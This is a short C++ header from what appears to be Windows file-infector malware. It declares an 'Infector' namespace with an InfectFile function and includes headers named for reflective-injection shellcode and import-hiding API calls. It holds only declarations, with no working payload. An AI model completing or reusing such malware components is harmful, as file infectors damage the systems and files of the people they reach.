#pragma once
#include <Windows.h>
#include "custom_std.h"
#include "ImportlessApi.hpp"
#include "ReflectiveInjectionShellcode.h"

#ifdef LOG_MESSAGEBOX
#define LOG(message) MessageBoxA(0, message, message, 0)
#endif

namespace Infector
{

    bool InfectFile(const wchar_t* path);

}





